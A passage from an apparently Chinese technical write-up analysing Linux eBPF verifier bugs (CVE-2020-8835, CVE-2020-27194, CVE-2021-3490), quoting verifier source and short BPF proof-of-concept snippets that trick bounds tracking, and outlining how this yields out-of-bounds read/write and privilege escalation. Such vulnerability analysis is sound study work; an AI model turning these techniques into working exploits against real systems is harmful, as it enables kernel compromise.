<p>这样如果没有<span><span class="heti-spacing"> </span>exit</span>，则<span class="heti-skip"><span class="heti-spacing"> </span>r6<span class="heti-spacing"> </span></span>一定大于等于<span><span class="heti-spacing"> </span>1</span>，所以<span class="heti-skip"><span class="heti-spacing"> </span>umin_value<span class="heti-spacing"> </span></span>就变为了<span><span class="heti-spacing"> </span>1</span>。同理通过<span class="heti-skip"><span class="heti-spacing"> </span>JMP<span class="heti-spacing"> </span></span>配合<span><span class="heti-spacing"> </span>BPF_JLE</span>，我们可以为<span class="heti-skip"><span class="heti-spacing"> </span>r6<span class="heti-spacing"> </span></span>设置<span class="heti-skip"><span class="heti-spacing"> </span>umax_value<span class="heti-spacing"> </span></span>为<span><span class="heti-spacing"> </span>0x1_0000_0001</span>。然后就可以通过<span class="heti-skip"><span class="heti-spacing"> </span>JMP32<span class="heti-spacing"> </span></span>来触发漏洞：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-5-1" id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="n">BPF_JMP32_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span><span class="w"> </span><span class="n">REG_6</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="c1">// if r6 != 5 goto +1</span>
<a href="#__codelineno-5-2" id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="n">BPF_EXIT_INSN</span><span class="p">()</span><span class="w">                     </span><span class="c1">// exit</span>
</code></pre></div>
<p><span>JMP32<span class="heti-spacing"> </span></span>后会对<span class="heti-skip"><span class="heti-spacing"> </span>r6<span class="heti-spacing"> </span></span>调用 <code>__reg_bound_offset32</code>，这样<span class="heti-skip"><span class="heti-spacing"> </span>r6<span class="heti-spacing"> </span></span>得到的新<span class="heti-skip"><span class="heti-spacing"> </span>var_off<span class="heti-spacing"> </span></span>就会因为<span class="heti-skip"><span class="heti-spacing"> </span>umin_value<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>umax_value<span class="heti-spacing"> </span></span>截断至<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位而确定为<span><span class="heti-spacing"> </span>1</span>。因此无论<span class="heti-skip"><span class="heti-spacing"> </span>r6<span class="heti-spacing"> </span></span>的初始值为多少（只要在<span class="heti-skip"><span class="heti-spacing"> </span>0x1 - 0x1_0000_0001<span class="heti-spacing"> </span></span>之间<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，都会被<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>确认为<span><span class="heti-spacing"> </span>1</span>，从而绕过了寄存器值检查。</p>
<p>而利用方法也很显然，我们只要令最开始的<span class="heti-skip"><span class="heti-spacing"> </span>r6<span class="heti-spacing"> </span></span>值为<span><span class="heti-spacing"> </span>2</span>，这样在操作后<span class="heti-skip"><span class="heti-spacing"> </span>r6<span class="heti-spacing"> </span></span>的实际值还是<span><span class="heti-spacing"> </span>2</span>，但<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>认为其是<span><span class="heti-spacing"> </span>1</span>。然后我们将<span class="heti-skip"><span class="heti-spacing"> </span>r6<span class="heti-spacing"> </span></span>右移一位，这样<span class="heti-skip"><span class="heti-spacing"> </span>r6<span class="heti-spacing"> </span></span>实际值为<span class="heti-skip"><span class="heti-spacing"> </span>1<span class="heti-spacing"> </span></span>但<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>为认为其为<span><span class="heti-spacing"> </span>0</span>。然后我们就可以为<span class="heti-skip"><span class="heti-spacing"> </span>r6<span class="heti-spacing"> </span></span>乘任意值来得到任意值，而<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>始终认为其为<span><span class="heti-spacing"> </span>0</span>，接下来就可以进行越界的任意地址读写，从而实现提权。</p>
<p>解决漏洞的方式也很显然，<code>__reg_bound_offset32</code> 是为了对<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位指令优化而引入的，但对于值的截断处理并不可取，所以删掉这个函数，对所有指令都进行<span class="heti-skip"><span class="heti-spacing"> </span>64<span class="heti-spacing"> </span></span>位的更新即可解决。</p>
<h3 id="cve-2020-27194">CVE-2020-27194<a class="headerlink" href="#cve-2020-27194" title="Permanent link">¶</a></h3>
<p>这个漏洞是由<span class="heti-skip"><span class="heti-spacing"> </span>Simon<span class="heti-spacing"> </span></span>在<span class="heti-skip"><span class="heti-spacing"> </span>fuzz Linux<span class="heti-spacing"> </span></span>的<span class="heti-skip"><span class="heti-spacing"> </span>ebpf<span class="heti-spacing"> </span></span>模块的时候发现的一个越界读写漏洞，后由<span class="heti-skip"><span class="heti-spacing"> </span>360<span class="heti-spacing"> </span></span>安全实现该漏洞的提权利用。漏洞的原理和前面的<span class="heti-skip"><span class="heti-spacing"> </span>CVE-2020-8835<span class="heti-spacing"> </span></span>非常类似，也是执行<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位指令后更新寄存器值出现了截断错误。</p>
<p>在<span class="heti-skip"><span class="heti-spacing"> </span>CVE-2020-8835<span class="heti-spacing"> </span></span>后，研究人员也发现了只保存<span class="heti-skip"><span class="heti-spacing"> </span>64<span class="heti-spacing"> </span></span>位取值的话有一些包含<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位操作的指令序列即使是合法的可能也不会通过<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>的检查，所以位 <code>bpf_reg_state</code> 结构体中添加了<span class="heti-skip"><span class="heti-spacing"> </span>{s,u}32_{min,max}_value<span class="heti-spacing"> </span></span>四个字段来记录低<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位的取值范围，并为每条指令分别更新<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位和<span class="heti-skip"><span class="heti-spacing"> </span>64<span class="heti-spacing"> </span></span>位的取值范围。而本漏洞的问题在于 <code>scalar32_min_max_or</code> 函数，这个函数中会意外截断：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-6-1" id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">scalar32_min_max_or</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_reg_state</span><span class="w"> </span><span class="o">*</span><span class="n">dst_reg</span><span class="p">,</span>
<a href="#__codelineno-6-2" id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="w">                </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_reg_state</span><span class="w"> </span><span class="o">*</span><span class="n">src_reg</span><span class="p">)</span>
<a href="#__codelineno-6-3" id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="p">{</span>
<a href="#__codelineno-6-4" id="__codelineno-6-4" name="__codelineno-6-4"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-6-5" id="__codelineno-6-5" name="__codelineno-6-5"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-6-6" id="__codelineno-6-6" name="__codelineno-6-6"></a><span class="w">        </span><span class="cm">/* ORing two positives gives a positive, so safe to</span>
<a href="#__codelineno-6-7" id="__codelineno-6-7" name="__codelineno-6-7"></a><span class="cm">         * cast result into s64.</span>
<a href="#__codelineno-6-8" id="__codelineno-6-8" name="__codelineno-6-8"></a><span class="cm">         */</span>
<a href="#__codelineno-6-9" id="__codelineno-6-9" name="__codelineno-6-9"></a><span class="w">        </span><span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">s32_min_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">umin_value</span><span class="p">;</span>
<a href="#__codelineno-6-10" id="__codelineno-6-10" name="__codelineno-6-10"></a><span class="w">        </span><span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">s32_max_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">umax_value</span><span class="p">;</span>
<a href="#__codelineno-6-11" id="__codelineno-6-11" name="__codelineno-6-11"></a><span class="w">    </span><span class="p">}</span>
<a href="#__codelineno-6-12" id="__codelineno-6-12" name="__codelineno-6-12"></a><span class="p">}</span>
</code></pre></div>
<p>在函数的末尾本打算将<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位的无符号值写回<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位有符号值的范围中（因为确定了都是正数，不会出现溢出<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，但代码中写的是<span class="heti-skip"><span class="heti-spacing"> </span>umin_value<span class="heti-spacing"> </span></span>和<span><span class="heti-spacing"> </span>umax_value</span>，即<span class="heti-skip"><span class="heti-spacing"> </span>64<span class="heti-spacing"> </span></span>位的无符号范围，这样这里就会直接截断，导致和<span class="heti-skip"><span class="heti-spacing"> </span>CVE-2020-8835<span class="heti-spacing"> </span></span>一样的问题。比如如下<span><span class="heti-spacing"> </span>PoC</span>：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-7-1" id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="w"> </span><span class="n">REG_5</span><span class="p">,</span><span class="w"> </span><span class="n">REG_4</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w">    </span><span class="c1">// r5 = mem[r4+0]</span>
<a href="#__codelineno-7-2" id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JGT</span><span class="p">,</span><span class="w"> </span><span class="n">REG_5</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w">       </span><span class="c1">// if r5 &gt; 0 goto +1</span>
<a href="#__codelineno-7-3" id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="n">BPF_EXIT_INSN</span><span class="p">()</span><span class="w">                         </span><span class="c1">// exit</span>
<a href="#__codelineno-7-4" id="__codelineno-7-4" name="__codelineno-7-4"></a><span class="n">BPF_LD_IMM64</span><span class="p">(</span><span class="n">REG_6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x100000001</span><span class="p">)</span><span class="w">        </span><span class="c1">// r6 = 0x100000001</span>
<a href="#__codelineno-7-5" id="__codelineno-7-5" name="__codelineno-7-5"></a><span class="n">BPF_JMP_REG</span><span class="p">(</span><span class="n">BPF_JLT</span><span class="p">,</span><span class="w"> </span><span class="n">REG_5</span><span class="p">,</span><span class="w"> </span><span class="n">REG_6</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w">   </span><span class="c1">// if r5 &lt; r6 goto +1</span>
<a href="#__codelineno-7-6" id="__codelineno-7-6" name="__codelineno-7-6"></a><span class="n">BPF_EXIT_INSN</span><span class="p">()</span><span class="w">                         </span><span class="c1">// exit</span>
</code></pre></div>
<p>这样我们就可以设置<span class="heti-skip"><span class="heti-spacing"> </span>r5<span class="heti-spacing"> </span></span>的<span class="heti-skip"><span class="heti-spacing"> </span>64<span class="heti-spacing"> </span></span>位范围为<span><span class="heti-spacing"> </span>0x1 - 0x1_0000_0001</span>，接下来我们通过<span class="heti-skip"><span class="heti-spacing"> </span>or<span class="heti-spacing"> </span></span>来触发这个漏洞：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-8-1" id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_OR</span><span class="p">,</span><span class="w"> </span><span class="n">REG_5</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w">         </span><span class="c1">// r5 = r5 | 0</span>
<a href="#__codelineno-8-2" id="__codelineno-8-2" name="__codelineno-8-2"></a><span class="n">BPF_MOV32_REG</span><span class="p">(</span><span class="n">REG_7</span><span class="p">,</span><span class="w"> </span><span class="n">REG_5</span><span class="p">)</span><span class="w">             </span><span class="c1">// r7 = r5(low 32)</span>
</code></pre></div>
<p>前一条指令进行了<span class="heti-skip"><span class="heti-spacing"> </span>or<span class="heti-spacing"> </span></span>运算，<span>verifier<span class="heti-spacing"> </span></span>会调用 <code>scalar32_min_max_or</code> 和 <code>scalar_min_max_or</code> 来更新，但<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位版本的末尾设置<span class="heti-skip"><span class="heti-spacing"> </span>s32_max_value<span class="heti-spacing"> </span></span>的时候出现了截断，<span>0x1_0000_0001<span class="heti-spacing"> </span></span>被截断为了<span><span class="heti-spacing"> </span>0x1</span>，这也就让<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>认为<span class="heti-skip"><span class="heti-spacing"> </span>r5<span class="heti-spacing"> </span></span>的低<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>为值就是<span><span class="heti-spacing"> </span>1</span>，然后我们通过<span class="heti-skip"><span class="heti-spacing"> </span>MOV32<span class="heti-spacing"> </span></span>指令就可以将其值赋值到<span class="heti-skip"><span class="heti-spacing"> </span>64<span class="heti-spacing"> </span></span>位寄存器中。</p>
<p>同理像<span class="heti-skip"><span class="heti-spacing"> </span>CVE-2020-8835<span class="heti-spacing"> </span></span>一样利用，令<span class="heti-skip"><span class="heti-spacing"> </span>r5<span class="heti-spacing"> </span></span>值为<span><span class="heti-spacing"> </span>2</span>，<span>verifier<span class="heti-spacing"> </span></span>会将其认为<span><span class="heti-spacing"> </span>1</span>，接下来右移一位再乘以任意值就可以实现任意地址的读写，从而实现提权。</p>
<h3 id="cve-2021-3490">CVE-2021-3490<a class="headerlink" href="#cve-2021-3490" title="Permanent link">¶</a></h3>
<p>这个漏洞也为<span class="heti-skip"><span class="heti-spacing"> </span>Manfred Paul<span class="heti-spacing"> </span></span>发现，和<span class="heti-skip"><span class="heti-spacing"> </span>CVE-2020-27194<span class="heti-spacing"> </span></span>一样都是<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>检查寄存器<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位值范围时出现了错误设置。本漏洞的问题在于对于<span class="heti-skip"><span class="heti-spacing"> </span>ALU<span class="heti-spacing"> </span></span>运算指令，如果<span class="heti-skip"><span class="heti-spacing"> </span>src<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>dst<span class="heti-spacing"> </span></span>值都完全确定，则<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位更新函数会直接返回（因为开发者假设<span class="heti-skip"><span class="heti-spacing"> </span>64<span class="heti-spacing"> </span></span>位的函数会更新范围<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，而<span class="heti-skip"><span class="heti-spacing"> </span>64<span class="heti-spacing"> </span></span>位更新函数会调用 <code>__mark_reg_known</code> 函数来设置<span class="heti-skip"><span class="heti-spacing"> </span>64<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位的范围为同样的值：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-9-1" id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">scalar32_min_max_and</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_reg_state</span><span class="w"> </span><span class="o">*</span><span class="n">dst_reg</span><span class="p">,</span>
<a href="#__codelineno-9-2" id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="w">                 </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_reg_state</span><span class="w"> </span><span class="o">*</span><span class="n">src_reg</span><span class="p">)</span>
<a href="#__codelineno-9-3" id="__codelineno-9-3" name="__codelineno-9-3"></a><span class="p">{</span>
<a href="#__codelineno-9-4" id="__codelineno-9-4" name="__codelineno-9-4"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-9-5" id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">src_known</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">dst_known</span><span class="p">)</span>
<a href="#__codelineno-9-6" id="__codelineno-9-6" name="__codelineno-9-6"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span>
<a href="#__codelineno-9-7" id="__codelineno-9-7" name="__codelineno-9-7"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-9-8" id="__codelineno-9-8" name="__codelineno-9-8"></a><span class="p">}</span>
<a href="#__codelineno-9-9" id="__codelineno-9-9" name="__codelineno-9-9"></a>
<a href="#__codelineno-9-10" id="__codelineno-9-10" name="__codelineno-9-10"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">scalar_min_max_and</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_reg_state</span><span class="w"> </span><span class="o">*</span><span class="n">dst_reg</span><span class="p">,</span>
<a href="#__codelineno-9-11" id="__codelineno-9-11" name="__codelineno-9-11"></a><span class="w">                   </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_reg_state</span><span class="w"> </span><span class="o">*</span><span class="n">src_reg</span><span class="p">)</span>
<a href="#__codelineno-9-12" id="__codelineno-9-12" name="__codelineno-9-12"></a><span class="p">{</span>
<a href="#__codelineno-9-13" id="__codelineno-9-13" name="__codelineno-9-13"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-9-14" id="__codelineno-9-14" name="__codelineno-9-14"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">src_known</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">dst_known</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-9-15" id="__codelineno-9-15" name="__codelineno-9-15"></a><span class="w">        </span><span class="n">__mark_reg_known</span><span class="p">(</span><span class="n">dst_reg</span><span class="p">,</span><span class="w"> </span><span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">var_off</span><span class="p">.</span><span class="n">value</span><span class="w"> </span><span class="o">&amp;</span>
<a href="#__codelineno-9-16" id="__codelineno-9-16" name="__codelineno-9-16"></a><span class="w">                      </span><span class="n">src_reg</span><span class="o">-&gt;</span><span class="n">var_off</span><span class="p">.</span><span class="n">value</span><span class="p">);</span>
<a href="#__codelineno-9-17" id="__codelineno-9-17" name="__codelineno-9-17"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span>
<a href="#__codelineno-9-18" id="__codelineno-9-18" name="__codelineno-9-18"></a><span class="w">    </span><span class="p">}</span>
<a href="#__codelineno-9-19" id="__codelineno-9-19" name="__codelineno-9-19"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-9-20" id="__codelineno-9-20" name="__codelineno-9-20"></a><span class="p">}</span>
<a href="#__codelineno-9-21" id="__codelineno-9-21" name="__codelineno-9-21"></a>
<a href="#__codelineno-9-22" id="__codelineno-9-22" name="__codelineno-9-22"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">__mark_reg_known</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_reg_state</span><span class="w"> </span><span class="o">*</span><span class="n">reg</span><span class="p">,</span><span class="w"> </span><span class="n">u64</span><span class="w"> </span><span class="n">imm</span><span class="p">)</span>
<a href="#__codelineno-9-23" id="__codelineno-9-23" name="__codelineno-9-23"></a><span class="p">{</span>
<a href="#__codelineno-9-24" id="__codelineno-9-24" name="__codelineno-9-24"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-9-25" id="__codelineno-9-25" name="__codelineno-9-25"></a><span class="w">    </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">smin_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">s64</span><span class="p">)</span><span class="n">imm</span><span class="p">;</span>
<a href="#__codelineno-9-26" id="__codelineno-9-26" name="__codelineno-9-26"></a><span class="w">    </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">smax_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">s64</span><span class="p">)</span><span class="n">imm</span><span class="p">;</span>
<a href="#__codelineno-9-27" id="__codelineno-9-27" name="__codelineno-9-27"></a><span class="w">    </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">umin_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">imm</span><span class="p">;</span>
<a href="#__codelineno-9-28" id="__codelineno-9-28" name="__codelineno-9-28"></a><span class="w">    </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">umax_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">imm</span><span class="p">;</span>
<a href="#__codelineno-9-29" id="__codelineno-9-29" name="__codelineno-9-29"></a>
<a href="#__codelineno-9-30" id="__codelineno-9-30" name="__codelineno-9-30"></a><span class="w">    </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">s32_min_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">s32</span><span class="p">)</span><span class="n">imm</span><span class="p">;</span>
<a href="#__codelineno-9-31" id="__codelineno-9-31" name="__codelineno-9-31"></a><span class="w">    </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">s32_max_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">s32</span><span class="p">)</span><span class="n">imm</span><span class="p">;</span>
<a href="#__codelineno-9-32" id="__codelineno-9-32" name="__codelineno-9-32"></a><span class="w">    </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">u32_min_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">u32</span><span class="p">)</span><span class="n">imm</span><span class="p">;</span>
<a href="#__codelineno-9-33" id="__codelineno-9-33" name="__codelineno-9-33"></a><span class="w">    </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">u32_max_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">u32</span><span class="p">)</span><span class="n">imm</span><span class="p">;</span>
<a href="#__codelineno-9-34" id="__codelineno-9-34" name="__codelineno-9-34"></a><span class="p">}</span>
</code></pre></div>
<p>但是在低<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位确定的情况下，<span>64<span class="heti-spacing"> </span></span>位不一定都确定，所以可能并不会调用到 <code>__mark_reg_known</code> 来更新范围，这样在 <code>adjust_scalar_min_max_vals</code> 函数末尾更新寄存器边界的时候就会出现问题：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-10-1" id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">adjust_scalar_min_max_vals</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_verifier_env</span><span class="w"> </span><span class="o">*</span><span class="n">env</span><span class="p">,</span>
<a href="#__codelineno-10-2" id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="w">                      </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_insn</span><span class="w"> </span><span class="o">*</span><span class="n">insn</span><span class="p">,</span>
<a href="#__codelineno-10-3" id="__codelineno-10-3" name="__codelineno-10-3"></a><span class="w">                      </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_reg_state</span><span class="w"> </span><span class="o">*</span><span class="n">dst_reg</span><span class="p">,</span>
<a href="#__codelineno-10-4" id="__codelineno-10-4" name="__codelineno-10-4"></a><span class="w">                      </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_reg_state</span><span class="w"> </span><span class="n">src_reg</span><span class="p">)</span>
<a href="#__codelineno-10-5" id="__codelineno-10-5" name="__codelineno-10-5"></a><span class="p">{</span>
<a href="#__codelineno-10-6" id="__codelineno-10-6" name="__codelineno-10-6"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-10-7" id="__codelineno-10-7" name="__codelineno-10-7"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">BPF_AND</span><span class="p">:</span>
<a href="#__codelineno-10-8" id="__codelineno-10-8" name="__codelineno-10-8"></a><span class="w">        </span><span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">var_off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tnum_and</span><span class="p">(</span><span class="n">dst_reg</span><span class="o">-&gt;</span><span class="n">var_off</span><span class="p">,</span><span class="w"> </span><span class="n">src_reg</span><span class="p">.</span><span class="n">var_off</span><span class="p">);</span>
<a href="#__codelineno-10-9" id="__codelineno-10-9" name="__codelineno-10-9"></a><span class="w">        </span><span class="n">scalar32_min_max_and</span><span class="p">(</span><span class="n">dst_reg</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">src_reg</span><span class="p">);</span>
<a href="#__codelineno-10-10" id="__codelineno-10-10" name="__codelineno-10-10"></a><span class="w">        </span><span class="n">scalar_min_max_and</span><span class="p">(</span><span class="n">dst_reg</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">src_reg</span><span class="p">);</span>
<a href="#__codelineno-10-11" id="__codelineno-10-11" name="__codelineno-10-11"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
<a href="#__codelineno-10-12" id="__codelineno-10-12" name="__codelineno-10-12"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-10-13" id="__codelineno-10-13" name="__codelineno-10-13"></a><span class="w">    </span><span class="n">__update_reg_bounds</span><span class="p">(</span><span class="n">dst_reg</span><span class="p">);</span><span class="w"> </span><span class="c1">// 调用 __update_reg32_bounds 和 __update_reg64_bounds</span>
<a href="#__codelineno-10-14" id="__codelineno-10-14" name="__codelineno-10-14"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-10-15" id="__codelineno-10-15" name="__codelineno-10-15"></a><span class="p">}</span>
<a href="#__codelineno-10-16" id="__codelineno-10-16" name="__codelineno-10-16"></a>
<a href="#__codelineno-10-17" id="__codelineno-10-17" name="__codelineno-10-17"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">__update_reg32_bounds</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_reg_state</span><span class="w"> </span><span class="o">*</span><span class="n">reg</span><span class="p">)</span>
<a href="#__codelineno-10-18" id="__codelineno-10-18" name="__codelineno-10-18"></a><span class="p">{</span>
<a href="#__codelineno-10-19" id="__codelineno-10-19" name="__codelineno-10-19"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">tnum</span><span class="w"> </span><span class="n">var32_off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tnum_subreg</span><span class="p">(</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">var_off</span><span class="p">);</span>
<a href="#__codelineno-10-20" id="__codelineno-10-20" name="__codelineno-10-20"></a>
<a href="#__codelineno-10-21" id="__codelineno-10-21" name="__codelineno-10-21"></a><span class="w">    </span><span class="cm">/* min signed is max(sign bit) | min(other bits) */</span>
<a href="#__codelineno-10-22" id="__codelineno-10-22" name="__codelineno-10-22"></a><span class="w">    </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">s32_min_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">max_t</span><span class="p">(</span><span class="n">s32</span><span class="p">,</span><span class="w"> </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">s32_min_value</span><span class="p">,</span><span class="w"> </span><span class="n">var32_off</span><span class="p">.</span><span class="n">value</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">var32_off</span><span class="p">.</span><span class="n">mask</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">S32_MIN</span><span class="p">));</span>
<a href="#__codelineno-10-23" id="__codelineno-10-23" name="__codelineno-10-23"></a><span class="w">    </span><span class="cm">/* max signed is min(sign bit) | max(other bits) */</span>
<a href="#__codelineno-10-24" id="__codelineno-10-24" name="__codelineno-10-24"></a><span class="w">    </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">s32_max_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">min_t</span><span class="p">(</span><span class="n">s32</span><span class="p">,</span><span class="w"> </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">s32_max_value</span><span class="p">,</span><span class="w"> </span><span class="n">var32_off</span><span class="p">.</span><span class="n">value</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">var32_off</span><span class="p">.</span><span class="n">mask</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">S32_MAX</span><span class="p">));</span>
